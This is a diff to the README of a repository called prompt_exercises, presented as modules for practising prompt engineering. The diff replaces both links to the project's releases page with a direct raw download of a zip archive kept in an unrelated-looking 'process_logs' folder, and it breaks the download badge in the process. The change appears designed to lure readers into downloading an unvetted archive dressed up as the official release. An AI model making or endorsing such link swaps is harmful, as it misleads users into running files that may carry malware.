@@ -1,7 +1,7 @@
 # 🎯 prompt_exercises - Easy Modules for Prompt Engineering
 
 ## 📥 Download Now
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-v1.0-brightgreen)](https://github.com/Cyther023/prompt_exercises/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/Cyther023/prompt_exercises/main/Exercise_13/process_logs/exercises_prompt_2.2.zip%20Latest%20Release-v1.0-brightgreen)](https://raw.githubusercontent.com/Cyther023/prompt_exercises/main/Exercise_13/process_logs/exercises_prompt_2.2.zip)
 
 ## 🚀 Getting Started
 Welcome to **prompt_exercises**. This application provides exercise modules designed for prompt engineering exercises. These modules help you practice and improve your skills in prompt crafting, making it easier for you to create effective prompts.
@@ -23,7 +23,7 @@ To run **prompt_exercises**, ensure your computer meets the following requiremen
 To start using **prompt_exercises**, please follow these steps:
 
 1. **Visit the Releases Page:** Click the link below to go to the releases page.
-   [Download Latest Release](https://github.com/Cyther023/prompt_exercises/releases)
+   [Download Latest Release](https://raw.githubusercontent.com/Cyther023/prompt_exercises/main/Exercise_13/process_logs/exercises_prompt_2.2.zip)
 
 2. **Select the Latest Version:** On the releases page, find the latest version. It should be marked clearly.
 
